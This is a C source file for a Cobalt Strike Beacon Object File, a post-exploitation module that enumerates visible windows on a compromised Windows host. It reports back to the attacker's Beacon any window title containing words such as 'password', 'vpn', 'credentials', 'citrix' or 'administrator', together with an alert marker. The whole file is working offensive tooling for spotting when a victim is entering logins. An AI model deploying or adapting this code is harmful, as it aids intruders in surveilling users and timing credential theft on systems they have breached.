#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "bofdefs.h"
#include <ctype.h>


#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
#ifdef BOF
	BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
#else
	printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

	return FALSE;
}


#pragma endregion

char match[] = "__TW_@L3R7__\n";
char wordtomatch[][100] = { "vpn","password","confidential","secret","login","credentials","login","logon","sign in","citrix","administrator","control panel" };

int alert = 2;

int tolower(int c)
{
    // Check if the character is uppercase
    if (c >= 'A' && c <= 'Z')
    {
        // Convert the character to lowercase by adding 32
        // (the difference between the uppercase and lowercase ASCII codes)
        c += 32;
    }

    // Return the lowercase character
    return c;
}

//
// Callback function. It will be called by EnumWindows function
//  as many times as there are windows
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    if (IsWindowVisible(hwnd)) // check whether window is visible
    {
        char wnd_title[256];
        GetWindowTextA(hwnd, (LPSTR)&wnd_title, sizeof(wnd_title));
        for (int i = 0; wnd_title[i]; i++) {
            wnd_title[i] = tolower(wnd_title[i]);
        }
        if (strlen(wnd_title) > 1) {
            int i = 0;
            for (size_t i = 0; i < sizeof(wordtomatch) / sizeof(wordtomatch[0]); i++) {
                char* ismatch = strstr(wnd_title, wordtomatch[i]);
                if (ismatch != NULL) {
                    BeaconPrintf(0x0, wnd_title);

                    alert = 1;
                }
            }

        }
    }
    return true; // function must return true if you want to continue enumeration
}

#ifdef BOF
void go(char* buff, int len) {
	EnumWindows(EnumWindowsProc, 0);

	if (alert == 1) {
		BeaconPrintf(0x0, match);
	}
	
}


#else

void main(int argc, char* argv[]) {
	EnumWindows(EnumWindowsProc, 0);
}

#endif